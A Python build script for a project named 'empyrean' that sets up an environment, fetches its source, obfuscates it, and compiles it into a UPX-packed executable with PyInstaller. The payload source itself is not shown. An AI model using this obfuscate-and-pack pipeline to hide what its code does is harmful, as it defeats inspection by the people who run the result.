import logging

import click
import requests
from rich.console import Console
from rich.logging import RichHandler

from util.build import Build
from util.makeenv import MakeEnv
from util.obfuscate import DoObfuscate
from util.writeconfig import WriteConfig


def main():
    stars = requests.get(
        f"https://api.github.com/repos/addi00000/empyrean").json()["stargazers_count"]
    forks = requests.get(
        f"https://api.github.com/repos/addi00000/empyrean").json()["forks_count"]

    logging.basicConfig(
        level="NOTSET",
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True,
                              tracebacks_suppress=[click])]
    )

    logging.getLogger("rich")
    console = Console()

    # config = Config()
    # config_data = config.get_config()

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    # We'll use a static configuration already fixed in /src/config.py. It
    # won't change between builds.
    
    # write_config = WriteConfig(config_data)
    # write_config.write_config()

    do_obfuscate = DoObfuscate()
    do_obfuscate.run()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()


if __name__ == "__main__":
    main()
